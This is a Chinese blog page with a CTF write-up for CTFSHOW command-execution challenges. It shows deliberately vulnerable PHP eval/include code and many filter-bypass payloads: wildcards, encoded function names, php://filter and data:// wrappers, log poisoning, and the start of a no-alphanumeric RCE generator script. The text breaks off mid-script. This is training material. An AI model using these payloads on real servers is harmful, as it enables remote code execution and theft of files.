<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>[CTFSHOW]命令执行 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="[CTFSHOW]命令执行" />
<meta property="og:description" content="文章目录 web 29web 30web 31web32web33-36web37web38web40web41web42web43web44web45web46web47-48web49web50web51web52web53web54web55-56web57web58web59web60web61-65web66-67web68-70web71web72web73-74web75-76web77参考文章 web 29 &lt;?php error_reporting(0); if(isset($_GET[&#39;c&#39;])){ $c = $_GET[&#39;c&#39;]; if(!preg_match(&#34;/flag/i&#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 我这里只想到五种简便的方法：
通配符 payload1:c=system(&#34;nl fla?????&#34;); payload2:c=system(&#34;nl fla*&#34;); payload3:c=echo `nl fl&#39;&#39;ag.php`;或者c=echo `nl fl“”ag.php`; payload4:c=echo `nl fl\ag.php`;//转义字符绕过 payload5:c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php payload6:c=eval($_GET[1]);&amp;1=system(&#39;nl flag.php&#39;); payload7:c=awk &#39;{printf $0}&#39; flag.php|| 还有很多姿势，毕竟等于没过滤 web 30 在上一道题的基础上多了system和php
&lt;?php error_reporting(0); if(isset($_GET[&#39;c&#39;])){ $c = $_GET[&#39;c&#39;]; if(!preg_match(&#34;/flag|system|php/i&#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 但是我们可以用其他函数鸭
system() passthru() exec() shell_exec() popen() proc_open() pcntl_exec() 反引号 同shell_exec() payload:" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/b752c7d4844853a13cc303164a1ef12d/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-12-01T21:31:22+08:00" />
<meta property="article:modified_time" content="2022-12-01T21:31:22+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">[CTFSHOW]命令执行</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-tomorrow-night">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#web_29_1" rel="nofollow">web 29</a></li><li><a href="#web_30_29" rel="nofollow">web 30</a></li><li><a href="#web_31_63" rel="nofollow">web 31</a></li><li><a href="#web32_109" rel="nofollow">web32</a></li><li><a href="#web3336_118" rel="nofollow">web33-36</a></li><li><a href="#web37_124" rel="nofollow">web37</a></li><li><a href="#web38_131" rel="nofollow">web38</a></li><li><a href="#web40_139" rel="nofollow">web40</a></li><li><a href="#web41_158" rel="nofollow">web41</a></li><li><a href="#web42_255" rel="nofollow">web42</a></li><li><a href="#web43_268" rel="nofollow">web43</a></li><li><a href="#web44_270" rel="nofollow">web44</a></li><li><a href="#web45_273" rel="nofollow">web45</a></li><li><a href="#web46_278" rel="nofollow">web46</a></li><li><a href="#web4748_283" rel="nofollow">web47-48</a></li><li><a href="#web49_286" rel="nofollow">web49</a></li><li><a href="#web50_299" rel="nofollow">web50</a></li><li><a href="#web51_301" rel="nofollow">web51</a></li><li><a href="#web52_303" rel="nofollow">web52</a></li><li><a href="#web53_306" rel="nofollow">web53</a></li><li><a href="#web54_313" rel="nofollow">web54</a></li><li><a href="#web5556_317" rel="nofollow">web55-56</a></li><li><a href="#web57_347" rel="nofollow">web57</a></li><li><a href="#web58_357" rel="nofollow">web58</a></li><li><a href="#web59_389" rel="nofollow">web59</a></li><li><a href="#web60_401" rel="nofollow">web60</a></li><li><a href="#web6165_422" rel="nofollow">web61-65</a></li><li><a href="#web6667_430" rel="nofollow">web66-67</a></li><li><a href="#web6870_439" rel="nofollow">web68-70</a></li><li><a href="#web71_447" rel="nofollow">web71</a></li><li><a href="#web72_495" rel="nofollow">web72</a></li><li><a href="#web7374_506" rel="nofollow">web73-74</a></li><li><a href="#web7576_515" rel="nofollow">web75-76</a></li><li><a href="#web77_526" rel="nofollow">web77</a></li><li><a href="#_531" rel="nofollow">参考文章</a></li></ul> 
</div> 
<p></p> 
<h2><a id="web_29_1"></a>web 29</h2> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>我这里只想到五种简便的方法：</p> 
<pre><code class="prism language-html">通配符
payload1:c=system("nl fla?????");
payload2:c=system("nl fla*");
payload3:c=echo `nl fl''ag.php`;或者c=echo `nl fl“”ag.php`;
payload4:c=echo `nl fl\ag.php`;//转义字符绕过
payload5:c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php
payload6:c=eval($_GET[1]);&amp;1=system('nl flag.php');
payload7:c=awk '{printf $0}' flag.php||
还有很多姿势，毕竟等于没过滤
</code></pre> 
<h2><a id="web_30_29"></a>web 30</h2> 
<p>在上一道题的基础上多了<code>system和php</code></p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>但是我们可以用其他函数鸭</p> 
<pre><code class="prism language-php"><span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">popen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">pcntl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
反引号 同<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
</code></pre> 
<p>payload:</p> 
<pre><code class="prism language-php">c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nl fla?????'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`nl fla''g.p''hp`</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`nl fla?????`</span><span class="token punctuation">;</span>
还有上一道题的很多payload都可以使用
</code></pre> 
<h2><a id="web_31_63"></a>web 31</h2> 
<p>过滤了<code>cat\sort等</code>,空格也被过滤了尝试了一堆方法无果，尝试搞骚得</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>cat被过滤</p> 
<blockquote> 
 <p>more:一页一页的显示档案内容<br> less:与 more 类似 head:查看头几行<br> tac:从最后一行开始显示，可以看出 tac 是<br> cat 的反向显示<br> tail:查看尾几行<br> nl：显示的时候，顺便输出行号<br> od:以二进制的方式读取档案内容<br> vi:一种编辑器，这个也可以查看<br> vim:一种编辑器，这个也可以查看<br> sort:可以查看<br> uniq:可以查看 file -f:报错出具体内容 grep<br> 1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</p> 
</blockquote> 
<p>payload:</p> 
<pre><code class="prism language-php">c<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nl flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">pos</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`nl%09fl[abc]*`</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token string double-quoted-string">"\x73\x79\x73\x74\x65\x6d"</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nl%09fl[a]*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>等价于<span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
c<span class="token operator">=</span><span class="token keyword">echo</span><span class="token string backtick-quoted-string">`strings%09f*`</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token keyword">echo</span><span class="token string backtick-quoted-string">`strings\$IFS\$9f*`</span>必须加转义字符
</code></pre> 
<p>还有其他姿势：<br> 首先<code>print_r(scandir(dirname(__FILE__)));</code>查看当前目录下文件<br> 然后找到<code>flag.php</code><br> <code>print_r(next(array_reverse(scandir(dirname(__FILE__)))));</code><br> 之后高亮显示即可<br> <code>c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</code></p> 
<h2><a id="web32_109"></a>web32</h2> 
<p>小知识：include不用括号，分号可以用?&gt;代替。<br> payload:</p> 
<pre><code class="prism language-php">c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">?</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-</span>
encode<span class="token operator">/</span>resource<span class="token operator">=</span>flag<span class="token operator">.</span>php
c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">?</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain,&lt;?php system("cat flag.php");?&gt;</span>
c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">?</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span>
</code></pre> 
<h2><a id="web3336_118"></a>web33-36</h2> 
<p>payload:</p> 
<pre><code class="prism language-php">c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">?</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span>
c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">?</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/palin,&lt;?php system("nl flag.php");?&gt;</span>
</code></pre> 
<h2><a id="web37_124"></a>web37</h2> 
<p>payload</p> 
<pre><code class="prism language-php">c<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/palin,&lt;?php system("nl fla*");?&gt;</span>
还可以配合<span class="token constant">UA</span>头执行日志包含
c<span class="token operator">=</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>access<span class="token operator">.</span>log
</code></pre> 
<h2><a id="web38_131"></a>web38</h2> 
<p>在上一道题的基础上过滤了php，和file<br> 所以</p> 
<pre><code class="prism language-php">c<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/palin;base64,PD9waHAgc3lzdGVtKCJubCBmbGEqIik7Pz4=</span>
也可以日志包含
c<span class="token operator">=</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>access<span class="token operator">.</span>log
</code></pre> 
<h2><a id="web40_139"></a>web40</h2> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//flag in flag.php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
        
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>payload</p> 
<pre><code class="prism language-php"><span class="token operator">?</span>c<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain,&lt;?php system(“cat f*”);?&gt;</span>
</code></pre> 
<h2><a id="web41_158"></a>web41</h2> 
<p>代码审计,首先看到过滤了数字和字母，我们不难想到那一篇P神的无数字字母RCE，大家可以去看看羽师傅写的脚本，我在参考文章那里放了链接<br> 这个题过滤了<code>$、+、-、^、~</code>使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符<code>|</code>。所以可以写脚本了</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i'</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo(<span class="token interpolation"><span class="token variable">$c</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>整理出了一个比较方便的脚本</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: Y4tacker
# @Date:   2020-11-21 20:31:22
*/</span>
<span class="token comment">//或</span>
<span class="token keyword">function</span> <span class="token function-definition function">orRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token class-name">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//异或</span>
<span class="token keyword">function</span> <span class="token function-definition function">xorRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//取反</span>
<span class="token keyword">function</span> <span class="token function-definition function">negateRce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">STDOUT</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'[+]your function: '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$system</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">STDOUT</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'[+]your command: '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$command</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'[*] (~'</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$system</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">')(~'</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">');'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//mode=1代表或，2代表异或，3代表取反</span>
<span class="token comment">//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式</span>
<span class="token keyword">function</span> <span class="token function-definition function">generate</span><span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token punctuation">,</span> <span class="token variable">$preg</span><span class="token operator">=</span><span class="token string single-quoted-string">'/[0-9]/i'</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">!=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rce.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                    <span class="token variable">$hex_i</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                    <span class="token variable">$hex_i</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                    <span class="token variable">$hex_j</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                    <span class="token variable">$hex_j</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
